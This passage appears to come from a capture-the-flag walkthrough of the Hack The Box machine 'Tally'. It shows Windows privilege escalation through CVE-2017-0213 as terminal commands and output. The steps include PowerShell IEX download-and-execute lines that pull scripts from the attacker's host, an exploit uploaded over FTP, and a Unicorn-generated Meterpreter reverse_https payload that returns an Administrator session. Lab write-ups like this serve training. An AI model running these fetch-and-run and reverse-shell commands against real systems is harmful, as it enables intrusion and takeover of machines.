10/19/2017  10:45 PM    <DIR>          .
10/19/2017  10:45 PM    <DIR>          ..
08/31/2017  02:03 AM                32 root.txt
               1 File(s)             32 bytes
               2 Dir(s)   1,864,040,448 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
608bb707348105911c8991108e523eda
C:\Users\Administrator\Desktop>
```

###### Privilege Escalation using cve-2017-0213

```sh
root@kali:~/tally/www# wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
--2018-05-31 20:00:43--  https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 151.101.0.133, 151.101.64.133, 151.101.128.133, ...
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|151.101.0.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15021 (15K) [text/plain]
Saving to: ‘Sherlock.ps1’

Sherlock.ps1                                       100%[================================================================================================================>]  14.67K  --.-KB/s    in 0.004s

2018-05-31 20:00:43 (3.39 MB/s) - ‘Sherlock.ps1’ saved [15021/15021]

root@kali:~/tally/www#
```

```sh
root@kali:~/tally/www# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.59 - - [31/May/2018 18:04:55] "GET /rev-9001.ps1 HTTP/1.1" 200 -
10.10.10.59 - - [31/May/2018 18:29:36] "GET /PowerUp.ps1 HTTP/1.1" 200 -
10.10.10.59 - - [31/May/2018 19:01:14] "GET /rev-9002.ps1 HTTP/1.1" 200 -
10.10.10.59 - - [31/May/2018 20:03:20] "GET /Sherlock.ps1 HTTP/1.1" 200 -
```

```sh
PS C:\Windows\system32> IEX(IWR('http://10.10.14.16/Sherlock.ps1'))
PS C:\Windows\system32> Find-AllVulns


Title      : User Mode to Ring (KiTrap0D)
MSBulletin : MS10-015
CVEID      : 2010-0232
Link       : https://www.exploit-db.com/exploits/11199/
VulnStatus : Not supported on 64-bit systems

Title      : Task Scheduler .XML
MSBulletin : MS10-092
CVEID      : 2010-3338, 2010-3888
Link       : https://www.exploit-db.com/exploits/19930/
VulnStatus : Not Vulnerable

Title      : NTUserMessageCall Win32k Kernel Pool Overflow
MSBulletin : MS13-053
CVEID      : 2013-1300
Link       : https://www.exploit-db.com/exploits/33213/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenuEx Win32k NULL Page
MSBulletin : MS13-081
CVEID      : 2013-3881
Link       : https://www.exploit-db.com/exploits/31576/
VulnStatus : Not supported on 64-bit systems

Title      : TrackPopupMenu Win32k Null Pointer Dereference
MSBulletin : MS14-058
CVEID      : 2014-4113
Link       : https://www.exploit-db.com/exploits/35101/
VulnStatus : Not Vulnerable

Title      : ClientCopyImage Win32k
MSBulletin : MS15-051
CVEID      : 2015-1701, 2015-2433
Link       : https://www.exploit-db.com/exploits/37367/
VulnStatus : Not Vulnerable

Title      : Font Driver Buffer Overflow
MSBulletin : MS15-078
CVEID      : 2015-2426, 2015-2433
Link       : https://www.exploit-db.com/exploits/38222/
VulnStatus : Not Vulnerable

Title      : 'mrxdav.sys' WebDAV
MSBulletin : MS16-016
CVEID      : 2016-0051
Link       : https://www.exploit-db.com/exploits/40085/
VulnStatus : Not supported on 64-bit systems

Title      : Secondary Logon Handle
MSBulletin : MS16-032
CVEID      : 2016-0099
Link       : https://www.exploit-db.com/exploits/39719/
VulnStatus : Not Supported on single-core systems

Title      : Win32k Elevation of Privilege
MSBulletin : MS16-135
CVEID      : 2016-7255
Link       : https://github.com/FuzzySecurity/PSKernel-Primitives/tree/master/Sample-Exploits/MS16-135
VulnStatus : Not Vulnerable

Title      : Nessus Agent 6.6.2 - 6.10.3
MSBulletin : N/A
CVEID      : 2017-7199
Link       : https://aspe1337.blogspot.co.uk/2017/04/writeup-of-cve-2017-7199.html
VulnStatus : Not Vulnerable



PS C:\Windows\system32>
```

```sh
PS C:\Windows\system32> systeminfo

Host Name:                 TALLY
OS Name:                   Microsoft Windows Server 2016 Standard
OS Version:                10.0.14393 N/A Build 14393
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Multiprocessor Free
Registered Owner:          Windows User
Registered Organization:
Product ID:                00376-30726-67778-AA877
Original Install Date:     28/08/2017, 15:43:34
System Boot Time:          29/05/2018, 09:43:56
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               x64-based PC
Processor(s):              2 Processor(s) Installed.
                           [01]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~1996 Mhz
                           [02]: AMD64 Family 23 Model 1 Stepping 2 AuthenticAMD ~1996 Mhz
BIOS Version:              Phoenix Technologies LTD 6.00, 05/04/2016
Windows Directory:         C:\Windows
System Directory:          C:\Windows\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-gb;English (United Kingdom)
Input Locale:              en-gb;English (United Kingdom)
Time Zone:                 (UTC+00:00) Dublin, Edinburgh, Lisbon, London
Total Physical Memory:     2,047 MB
Available Physical Memory: 110 MB
Virtual Memory: Max Size:  4,764 MB
Virtual Memory: Available: 789 MB
Virtual Memory: In Use:    3,975 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB.LOCAL
Logon Server:              \\TALLY
Hotfix(s):                 2 Hotfix(s) Installed.
                           [01]: KB3199986
                           [02]: KB4015217
Network Card(s):           1 NIC(s) Installed.
                           [01]: Intel(R) 82574L Gigabit Network Connection
                                 Connection Name: Ethernet0
                                 DHCP Enabled:    No
                                 IP address(es)
                                 [01]: 10.10.10.59
                                 [02]: fe80::7424:b29a:2494:3336
                                 [03]: dead:beef::7424:b29a:2494:3336
Hyper-V Requirements:      A hypervisor has been detected. Features required for Hyper-V will not be displayed.
PS C:\Windows\system32>
```

![](images/14.png)

![](images/15.png)

![](images/16.png)

![](images/17.png)

![](images/18.png)

![](images/19.png)

![](images/20.png)

![](images/21.png)

![](images/22.png)

![](images/23.png)

![](images/24.png)

![](images/25.png)

![](images/26.png)

![](images/27.png)

```sh
C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC>dir
 Volume in drive C has no label.
 Volume Serial Number is A64A-934E

 Directory of C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC

05/31/2018  08:28 PM    <DIR>          .
05/31/2018  08:28 PM    <DIR>          ..
05/31/2018  08:06 PM    <DIR>          atlmfc
05/31/2018  09:39 PM    <DIR>          bin
05/31/2018  08:06 PM    <DIR>          crt
05/31/2018  08:07 PM    <DIR>          include
05/31/2018  09:40 PM    <DIR>          lib
05/31/2018  08:07 PM    <DIR>          Profile
05/31/2018  11:15 PM    <DIR>          redist
05/31/2018  08:08 PM    <DIR>          Snippets
05/31/2018  08:17 PM    <DIR>          UnitTest
05/31/2018  08:08 PM    <DIR>          VCAddClass
05/31/2018  08:07 PM    <DIR>          VCContextItems
09/20/2015  05:20 PM               160 vcEmptyTestProject.vsz
05/31/2018  08:07 PM    <DIR>          VCNewItems
05/31/2018  08:28 PM    <DIR>          vcpackages
05/31/2018  08:28 PM    <DIR>          VCProjectDefaults
05/31/2018  08:07 PM    <DIR>          vcprojectitems
05/31/2018  08:08 PM    <DIR>          vcprojects
05/31/2018  08:08 PM    <DIR>          VCResourceTemplates
06/09/2016  10:25 PM             3,337 vcvarsall.bat
05/31/2018  08:28 PM    <DIR>          VCWizards
               2 File(s)          3,497 bytes
              20 Dir(s)  31,017,553,920 bytes free

C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC>vcvarsall.bat amd64

C:\Program Files (x86)\Microsoft Visual Studio 14.0\VC>cd \

C:\>cl
Microsoft (R) C/C++ Optimizing Compiler Version 19.00.24215.1 for x64
Copyright (C) Microsoft Corporation.  All rights reserved.

usage: cl [ option... ] filename... [ /link linkoption... ]

C:\>
```

[`CVE-2017-0213.cpp`](https://github.com/WindowsExploits/Exploits/blob/master/CVE-2017-0213/Source/CVE-2017-0213.cpp)

![](images/28.png)

![](images/29.png)

![](images/30.png)

![](images/31.png)

![](images/32.png)

```sh
C:\Users\ksunnam\Desktop>cl CVE-2017-0213.cpp /EHsc /DUNICODE /D_UNICODE
Microsoft (R) C/C++ Optimizing Compiler Version 19.00.24215.1 for x64
Copyright (C) Microsoft Corporation.  All rights reserved.

CVE-2017-0213.cpp
Microsoft (R) Incremental Linker Version 14.00.24215.1
Copyright (C) Microsoft Corporation.  All rights reserved.

/out:CVE-2017-0213.exe
CVE-2017-0213.obj

C:\Users\ksunnam\Desktop>dir
 Volume in drive C has no label.
 Volume Serial Number is A64A-934E

 Directory of C:\Users\ksunnam\Desktop

05/31/2018  11:30 PM    <DIR>          .
05/31/2018  11:30 PM    <DIR>          ..
05/31/2018  11:27 PM            24,940 CVE-2017-0213.cpp
05/31/2018  11:30 PM           169,472 CVE-2017-0213.exe
05/31/2018  11:30 PM           204,638 CVE-2017-0213.obj
               3 File(s)        399,050 bytes
               2 Dir(s)  30,981,660,672 bytes free

C:\Users\ksunnam\Desktop>
```

```sh
root@kali:~/tally# ftp 10.10.10.59
Connected to 10.10.10.59.
220 Microsoft FTP Service
Name (10.10.10.59:root): ftp_user
331 Password required
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> binary
200 Type set to I.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
08-31-17  11:51PM       <DIR>          From-Custodian
06-01-18  12:45AM       <DIR>          Intranet
08-28-17  06:56PM       <DIR>          Logs
09-15-17  09:30PM       <DIR>          To-Upload
09-17-17  09:27PM       <DIR>          User
226 Transfer complete.
ftp> cd Intranet
250 CWD command successful.
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
09-11-17  10:25PM       <DIR>          Binaries
06-01-18  12:31AM              2873282 ebowlashell9004.exe
06-01-18  12:45AM               348672 lonelypotato.exe
226 Transfer complete.
ftp> put CVE-2017-0213.exe
local: CVE-2017-0213.exe remote: CVE-2017-0213.exe
200 PORT command successful.
125 Data connection already open; Transfer starting.
226 Transfer complete.
169472 bytes sent in 0.64 secs (257.2472 kB/s)
ftp> dir
200 PORT command successful.
125 Data connection already open; Transfer starting.
09-11-17  10:25PM       <DIR>          Binaries
06-01-18  07:37AM               169472 CVE-2017-0213.exe
06-01-18  12:31AM              2873282 ebowlashell9004.exe
06-01-18  12:45AM               348672 lonelypotato.exe
226 Transfer complete.
ftp> rename ebowlashell9004.exe myexecshell.exe
350 Requested file action pending further information.
250 RNTO command successful.
ftp> dir
200 PORT command successful.
150 Opening ASCII mode data connection.
09-11-17  10:25PM       <DIR>          Binaries
06-01-18  07:37AM               169472 CVE-2017-0213.exe
06-01-18  12:45AM               348672 lonelypotato.exe
06-01-18  12:31AM              2873282 myexecshell.exe
226 Transfer complete.
ftp> exit
221 Goodbye.
root@kali:~/tally#
```

```sh
PS C:\FTP\Intranet> cp CVE-2017-0213.exe C:\Users\Sarah
PS C:\Users\Sarah> cp C:\FTP\Intranet\myexecshell.exe .
PS C:\Users\Sarah> dir


    Directory: C:\Users\Sarah


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       31/08/2017     22:57                Contacts
d-r---       29/05/2018     09:45                Desktop
d-r---       13/10/2017     21:38                Documents
d-r---       01/10/2017     20:34                Downloads
d-r---       31/08/2017     22:57                Favorites
d-r---       31/08/2017     22:57                Links
d-r---       31/08/2017     22:57                Music
d-r---       31/08/2017     22:57                Pictures
d-r---       31/08/2017     22:57                Saved Games
d-r---       31/08/2017     22:57                Searches
d-r---       31/08/2017     22:57                Videos
-a----       01/06/2018     07:37         169472 CVE-2017-0213.exe
-a----       01/06/2018     00:31        2873282 myexecshell.exe


PS C:\Users\Sarah>
```

```sh
root@kali:~/tally# git clone https://github.com/trustedsec/unicorn.git
Cloning into 'unicorn'...
remote: Counting objects: 340, done.
remote: Total 340 (delta 0), reused 0 (delta 0), pack-reused 340
Receiving objects: 100% (340/340), 163.94 KiB | 1.48 MiB/s, done.
Resolving deltas: 100% (215/215), done.
root@kali:~/tally# cd unicorn/
root@kali:~/tally/unicorn# ls
CHANGELOG.txt  CREDITS.txt  LICENSE.txt  README.md  unicorn.py
root@kali:~/tally/unicorn# ./unicorn.py

                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |\)\ ) /(/|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:


aHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2VlcE1hdHRIYXBweS5qcGc=


-------------------- Magic Unicorn Attack Vector v3.1 -----------------------------

Native x86 powershell injection attacks on any Windows platform.
Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)
Twitter: @TrustedSec, @HackingDave
Credits: Matthew Graeber, Justin Elze, Chris Gates

Happy Magic Unicorns.

Usage: python unicorn.py payload reverse_ipaddr port <optional hta or macro, crt>
PS Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443
PS Down/Exec: python unicorn.py windows/download_exec url=http://badurl.com/payload.exe
Macro Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 macro
Macro Example CS: python unicorn.py <cobalt_strike_file.cs> cs macro
Macro Example Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode macro
HTA Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 hta
HTA Example CS: python unicorn.py <cobalt_strike_file.cs> cs hta
HTA Example Shellcode: python unicorn.py <path_to_shellcode.txt>: shellcode hta
DDE Example: python unicorn.py windows/meterpreter/reverse_https 192.168.1.5 443 dde
CRT Example: python unicorn.py <path_to_payload/exe_encode> crt
Custom PS1 Example: python unicorn.py <path to ps1 file>
Custom PS1 Example: python unicorn.py <path to ps1 file> macro 500
Cobalt Strike Example: python unicorn.py <cobalt_strike_file.cs> cs (export CS in C# format)
Custom Shellcode: python unicorn.py <path_to_shellcode.txt> shellcode (formatted 0x00)
Help Menu: python unicorn.py --help

root@kali:~/tally/unicorn# ./unicorn.py windows/meterpreter/reverse_https 10.10.14.16 443
[*] Generating the payload shellcode.. This could take a few seconds/minutes as we create the shellcode...

                                                         ,/
                                                        //
                                                      ,//
                                          ___   /|   |//
                                      `__/\_ --(/|___/-/
                                   \|\_-\___ __-_`- /-/ \.
                                  |\_-___,-\_____--/_)' ) \
                                   \ -_ /     __ \( `( __`\|
                                   `\__|      |\)\ ) /(/|
           ,._____.,            ',--//-|      \  |  '   /
          /     __. \,          / /,---|       \       /
         / /    _. \  \        `/`_/ _,'        |     |
        |  | ( (  \   |      ,/\'__/'/          |     |
        |  \  \`--, `_/_------______/           \(   )/
        | | \  \_. \,                            \___/\
        | |  \_   \  \                                 \
        \ \    \_ \   \   /                             \
         \ \  \._  \__ \_|       |                       \
          \ \___  \      \       |                        \
           \__ \__ \  \_ |       \                         |
           |  \_____ \  ____      |                        |
           | \  \__ ---' .__\     |        |               |
           \  \__ ---   /   )     |        \              /
            \   \____/ / ()(      \          `---_       /|
             \__________/(,--__    \_________.    |    ./ |
               |     \ \  `---_\--,           \   \_,./   |
               |      \  \_ ` \    /`---_______-\   \\    /
                \      \.___,`|   /              \   \\   \
                 \     |  \_ \|   \              (   |:    |
                  \    \      \    |             /  / |    ;
                   \    \      \    \          ( `_'   \  |
                    \.   \      \.   \          `__/   |  |
                      \   \       \.  \                |  |
                       \   \        \  \               (  )
                        \   |        \  |              |  |
                         |  \         \ \              I  `
                         ( __;        ( _;            ('-_';
                         |___\        \___:            \___:


aHR0cHM6Ly93d3cuYmluYXJ5ZGVmZW5zZS5jb20vd3AtY29udGVudC91cGxvYWRzLzIwMTcvMDUvS2VlcE1hdHRIYXBweS5qcGc=


Written by: Dave Kennedy at TrustedSec (https://www.trustedsec.com)
Twitter: @TrustedSec, @HackingDave

Happy Magic Unicorns.

[********************************************************************************************************]

				-----POWERSHELL ATTACK INSTRUCTIONS----

Everything is now generated in two files, powershell_attack.txt and unicorn.rc. The text file contains  all of the code needed in order to inject the powershell attack into memory. Note you will need a place that supports remote command injection of some sort. Often times this could be through an excel/word  doc or through psexec_commands inside of Metasploit, SQLi, etc.. There are so many implications and  scenarios to where you can use this attack at. Simply paste the powershell_attack.txt command in any command prompt window or where you have the ability to call the powershell executable and it will give a shell back to you. This attack also supports windows/download_exec for a payload method instead of just Meterpreter payloads. When using the download and exec, simply put python unicorn.py windows/download_exec url=https://www.thisisnotarealsite.com/payload.exe and the powershell code will download the payload and execute.

Note that you will need to have a listener enabled in order to capture the attack.

[*******************************************************************************************************]

[*] Exported powershell output code to powershell_attack.txt.
[*] Exported Metasploit RC file as unicorn.rc. Run msfconsole -r unicorn.rc to execute and create listener.


root@kali:~/tally/unicorn# mv powershell_attack.txt msf.ps1
root@kali:~/tally/unicorn# cp msf.ps1 ../www/
root@kali:~/tally/unicorn#
```

```sh
PS C:\Users\Sarah> IEX(IWR('http://10.10.14.16/msf.ps1'))
```

```sh
root@kali:~/tally/www# python -m SimpleHTTPServer 80
Serving HTTP on 0.0.0.0 port 80 ...
10.10.10.59 - - [31/May/2018 18:04:55] "GET /rev-9001.ps1 HTTP/1.1" 200 -
10.10.10.59 - - [31/May/2018 18:29:36] "GET /PowerUp.ps1 HTTP/1.1" 200 -
10.10.10.59 - - [31/May/2018 19:01:14] "GET /rev-9002.ps1 HTTP/1.1" 200 -
10.10.10.59 - - [31/May/2018 20:03:20] "GET /Sherlock.ps1 HTTP/1.1" 200 -
10.10.10.59 - - [31/May/2018 20:05:14] "GET /Sherlock.ps1 HTTP/1.1" 200 -
10.10.10.59 - - [01/Jun/2018 02:56:19] "GET /msf.ps1 HTTP/1.1" 200 -
```

```sh
root@kali:~/tally/unicorn# msfconsole -r unicorn.rc

                          ########                  #
                      #################            #
                   ######################         #
                  #########################      #
                ############################
               ##############################
               ###############################
              ###############################
              ##############################
                              #    ########   #
                 ##        ###        ####   ##
                                      ###   ###
                                    ####   ###
               ####          ##########   ####
               #######################   ####
                 ####################   ####
                  ##################  ####
                    ############      ##
                       ########        ###
                      #########        #####
                    ############      ######
                   ########      #########
                     #####       ########
                       ###       #########
                      ######    ############
                     #######################
                     #   #   ###  #   #   ##
                     ########################
                      ##     ##   ##     ##
                            https://metasploit.com


       =[ metasploit v4.16.58-dev                         ]
+ -- --=[ 1769 exploits - 1007 auxiliary - 307 post       ]
+ -- --=[ 537 payloads - 41 encoders - 10 nops            ]
+ -- --=[ Free Metasploit Pro trial: http://r-7.co/trymsp ]

[*] Processing unicorn.rc for ERB directives.
resource (unicorn.rc)> use multi/handler
resource (unicorn.rc)> set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
resource (unicorn.rc)> set LHOST 10.10.14.16
LHOST => 10.10.14.16
resource (unicorn.rc)> set LPORT 443
LPORT => 443
resource (unicorn.rc)> set ExitOnSession false
ExitOnSession => false
resource (unicorn.rc)> set EnableStageEncoding true
EnableStageEncoding => true
resource (unicorn.rc)> exploit -j
[*] Exploit running as background job 0.
msf exploit(multi/handler) >
[*] Started HTTPS reverse handler on https://10.10.14.16:443
[*] https://10.10.14.16:443 handling request from 10.10.10.59; (UUID: ffbcbrno) Encoded stage with x86/shikata_ga_nai
[*] https://10.10.14.16:443 handling request from 10.10.10.59; (UUID: ffbcbrno) Staging x86 payload (180854 bytes) ...
[*] Meterpreter session 1 opened (10.10.14.16:443 -> 10.10.10.59:53843) at 2018-06-01 02:56:34 -0400

msf exploit(multi/handler) > sessions -i

Active sessions
===============

  Id  Name  Type                     Information                  Connection
  --  ----  ----                     -----------                  ----------
  1         meterpreter x86/windows  TALLY\Administrator @ TALLY  10.10.14.16:443 -> 10.10.10.59:53843 (10.10.10.59)

msf exploit(multi/handler) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > shell
Process 11596 created.
Channel 1 created.
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Users\Sarah>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 8EB3-6DCB

 Directory of C:\Users\Sarah

01/06/2018  07:49    <DIR>          .
01/06/2018  07:49    <DIR>          ..
31/08/2017  22:57    <DIR>          Contacts
01/06/2018  07:37           169,472 CVE-2017-0213.exe
29/05/2018  09:45    <DIR>          Desktop
13/10/2017  21:38    <DIR>          Documents
01/10/2017  20:34    <DIR>          Downloads
31/08/2017  22:57    <DIR>          Favorites
31/08/2017  22:57    <DIR>          Links
31/08/2017  22:57    <DIR>          Music
01/06/2018  00:31         2,873,282 myexecshell.exe
31/08/2017  22:57    <DIR>          Pictures
31/08/2017  22:57    <DIR>          Saved Games
31/08/2017  22:57    <DIR>          Searches
31/08/2017  22:57    <DIR>          Videos
               2 File(s)      3,042,754 bytes
              13 Dir(s)   2,549,108,736 bytes free

C:\Users\Sarah>CVE-2017-0213.exe
CVE-2017-0213.exe
Building Library with path: script:C:\Users\Sarah\run.sct
Found TLB name at offset 766
QI - Marshaller: {00000000-0000-0000-C000-000000000046} 00000230DD0FAD50
Queried Success: 00000230DD0FAD50
AddRef: 1
QI - Marshaller: {0000001B-0000-0000-C000-000000000046} 00000230DD0FAD50
QI - Marshaller: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 00000230DD0FAD50
QI - Marshaller: {00000000-0000-0000-C000-000000000046} 00000230DD0FAD50
Queried Success: 00000230DD0FAD50
AddRef: 2
QI - Marshaller: {00000018-0000-0000-C000-000000000046} 00000230DD0FAD50
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 00000230DD0FAD50
QI - Marshaller: {00000040-0000-0000-C000-000000000046} 00000230DD0FAD50
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 00000230DD0FAD50
QI - Marshaller: {94EA2B94-E9CC-49E0-C0FF-EE64CA8F5B90} 00000230DD0FAD50
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 00000230DD0FAD50
QI - Marshaller: {77DD1250-139C-2BC3-BD95-900ACED61BE5} 00000230DD0FAD50
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 00000230DD0FAD50
QI - Marshaller: {BFD60505-5A1F-4E41-88BA-A6FB07202DA9} 00000230DD0FAD50
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 00000230DD0FAD50
QI - Marshaller: {03FB5C57-D534-45F5-A1F4-D39556983875} 00000230DD0FAD50
QI - Marshaller: {334D391F-0E79-3B15-C9FF-EAC65DD07C42} 00000230DD0FAD50
QI - Marshaller: {2C258AE7-50DC-49FF-9D1D-2ECB9A52CDD7} 00000230DD0FAD50
QI - Marshaller: {00000019-0000-0000-C000-000000000046} 00000230DD0FAD50
QI - Marshaller: {4C1E39E1-E3E3-4296-AA86-EC938D896E92} 00000230DD0FAD50
Release: 3
Opened Link \??\C: -> \Device\HarddiskVolume1\Users\Sarah: 00000000000001D0
QI - Marshaller: {00000003-0000-0000-C000-000000000046} 00000230DD0FAAB0
Queried Success: 00000230DD0FAAB0
AddRef: 1
Release: 2
QI - Marshaller: {ECC8691B-C1DB-4DC0-855E-65F6C551AF49} 00000230DD0FAAB0
QI - Marshaller: {00000003-0000-0000-C000-000000000046} 00000230DD0FAAB0
Queried Success: 00000230DD0FAAB0
AddRef: 1
Marshal Interface: {00000000-0000-0000-C000-000000000046}
AddRef: 2
AddRef: 3
Release: 4
Marshal Complete: 00000000
Release: 2
AddRef: 3
Release: 4
Release: 3
Result: 800704DD
Done
Release: 1
Release object 00000230DD0FAAB0
Release: 2

C:\Users\Sarah>
C:\Users\Sarah>exit
exit
meterpreter > ps

Process List
============

 PID    PPID   Name                        Arch  Session  User                          Path
 ---    ----   ----                        ----  -------  ----                          ----
 0      0      [System Process]
 4      0      System                      x64   0
 288    4      smss.exe                    x64   0
 364    584    svchost.exe                 x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 380    372    csrss.exe                   x64   0
 460    372    wininit.exe                 x64   0
 468    452    csrss.exe                   x64   1
 536    452    winlogon.exe                x64   1        NT AUTHORITY\SYSTEM           C:\Windows\System32\winlogon.exe
 560    11216  powershell.exe              x64   0        TALLY\Administrator           C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
 584    460    services.exe                x64   0
 592    460    lsass.exe                   x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe
 676    584    svchost.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 736    584    svchost.exe                 x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 772    584    vmacthlp.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmacthlp.exe
 820    536    dwm.exe                     x64   1        Window Manager\DWM-1          C:\Windows\System32\dwm.exe
 864    584    svchost.exe                 x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 880    584    svchost.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 920    584    svchost.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1000   584    svchost.exe                 x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1036   584    svchost.exe                 x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1056   584    vmtoolsd.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\vmtoolsd.exe
 1080   584    VGAuthService.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe
 1092   584    MsMpEng.exe                 x64   0
 1160   584    svchost.exe                 x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\System32\svchost.exe
 1280   584    ManagementAgentHost.exe     x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\VMware\VMware Tools\VMware CAF\pme\bin\ManagementAgentHost.exe
 1472   584    svchost.exe                 x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Windows\System32\svchost.exe
 1556   584    spoolsv.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1612   584    svchost.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1620   584    c2wtshost.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Windows Identity Foundation\v3.5\c2wtshost.exe
 1628   584    svchost.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1636   584    svchost.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1644   584    inetinfo.exe                x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\inetsrv\inetinfo.exe
 1684   584    svchost.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1700   584    svchost.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
 1716   584    sqlservr.exe                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Microsoft SQL Server\MSSQL10_50.SHAREPOINT\MSSQL\Binn\sqlservr.exe
 1724   584    SMSvcHost.exe               x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe
 1744   1752   conhost.exe                 x64   0        NT SERVICE\SQLSERVERAGENT     C:\Windows\System32\conhost.exe
 1752   584    SQLAGENT.EXE                x64   0        NT SERVICE\SQLSERVERAGENT     C:\Program Files\Microsoft SQL Server\MSSQL13.MSSQLSERVER\MSSQL\Binn\SQLAGENT.EXE
 1800   584    OWSTIMER.EXE                x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Common Files\microsoft shared\Web Server Extensions\15\BIN\OWSTIMER.EXE
 1812   584    hostcontrollerservice.exe   x64   0        NT AUTHORITY\NETWORK SERVICE  C:\Program Files\Windows SharePoint Services\15.0\Search\HostController\hostcontrollerservice.exe
 1840   584    wsstracing.exe              x64   0        NT AUTHORITY\LOCAL SERVICE    C:\Program Files\Common Files\microsoft shared\Web Server Extensions\15\BIN\wsstracing.exe
 1876   584    sqlwriter.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Program Files\Microsoft SQL Server\90\Shared\sqlwriter.exe
 2016   920    taskhostw.exe               x64   1        TALLY\Sarah                   C:\Windows\System32\taskhostw.exe
 2040   584    svchost.exe                 x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\svchost.exe
